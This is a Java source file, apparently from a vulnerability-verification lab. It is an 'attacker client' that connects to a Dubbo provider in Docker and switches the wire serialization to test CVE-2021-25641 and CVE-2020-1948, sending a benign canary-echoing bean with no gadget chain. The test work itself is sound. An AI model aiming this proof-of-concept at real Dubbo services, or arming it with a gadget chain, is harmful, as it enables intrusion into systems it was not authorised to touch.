package com.pcb;

import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;

/**
 * The attacker CLIENT. A SEPARATE process, in a SEPARATE container, that connects to the REAL Dubbo
 * provider over the REAL docker network (dubbo://<host>:<port>) -- NOT `docker compose exec` inside
 * the provider. It is a legitimate Dubbo consumer whose ONLY malicious act is choosing the
 * serialization protocol it puts on the wire -- exactly the CVE-2021-25641 primitive (the client
 * flips the Dubbo frame's serialization-id byte by selecting a different serializer). It calls
 * DemoService.probe(new PcbFlagProbe()); the provider then deserializes the argument with whatever
 * serializer the client selected.
 *
 *   args[0] = provider host (docker-network service name, e.g. "v1")
 *   args[1] = provider dubbo:// TCP port (20880)
 *   args[2] = serialization name: "hessian2" (id 2, the CVE-2020-1948 ORIGINAL form) or
 *             "native-hessian" (id 10, the CVE-2021-25641 serializer-switch RESIDUAL).
 *
 * Runs with -Dpcb.role=client so the client-side "new PcbFlagProbe()" instance stays SILENT; only
 * the PROVIDER-side instantiation echoes the planted flag to the provider's Docker service log.
 * No gadget chain, no command execution -- the argument object is a benign bean that merely echoes
 * a random per-run canary token when instantiated on the provider.
 */
public class Client {
    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : Provider.PORT;
        String serialization = args.length > 2 ? args[2] : "hessian2";
        System.setProperty("pcb.role", "client");
        System.setProperty("dubbo.application.qos.enable", "false");
        System.setProperty("java.net.preferIPv4Stack", "true");

        ApplicationConfig application = new ApplicationConfig("pcb-dubbo-consumer");
        application.setQosEnable(false);

        String result = "EXC:unset";
        // Direct connection over the real docker network to the provider; the serialization= param
        // sets the id byte the client emits, independent of the provider's configured serialization
        // -> the serializer switch. heartbeat=0 avoids 2.7.8-client / 2.7.6-server close-on-hb.
        String url = "dubbo://" + host + ":" + port + "/" + DemoService.class.getName()
                + "?version=" + Provider.VERSION + "&serialization=" + serialization
                + "&heartbeat=0&check=false";
        for (int attempt = 0; attempt < 5; attempt++) {
            ReferenceConfig<DemoService> reference = new ReferenceConfig<>();
            reference.setApplication(application);
            reference.setInterface(DemoService.class);
            reference.setVersion(Provider.VERSION);
            reference.setTimeout(15000);
            reference.setRetries(0);
            reference.setCheck(false);
            reference.setUrl(url);
            try {
                DemoService svc = reference.get();
                result = svc.probe(new PcbFlagProbe());
                try { reference.destroy(); } catch (Throwable ignore) {}
                break;
            } catch (Throwable t) {
                Throwable c = t;
                while (c.getCause() != null && c.getCause() != c) c = c.getCause();
                result = "EXC:" + c.getClass().getSimpleName() + ":" + String.valueOf(c.getMessage());
                try { reference.destroy(); } catch (Throwable ignore) {}
                try { Thread.sleep(1500L * (attempt + 1)); } catch (InterruptedException ie) { Thread.interrupted(); }
            }
        }
        System.out.println("{\"serialization\":\"" + serialization + "\",\"client_result\":\""
                + String.valueOf(result).replace("\"", "'").replace("\n", " ") + "\"}");
        System.out.flush();
        // Force exit: Dubbo leaves non-daemon threads that would otherwise hang the run.
        Runtime.getRuntime().halt(0);
    }
}
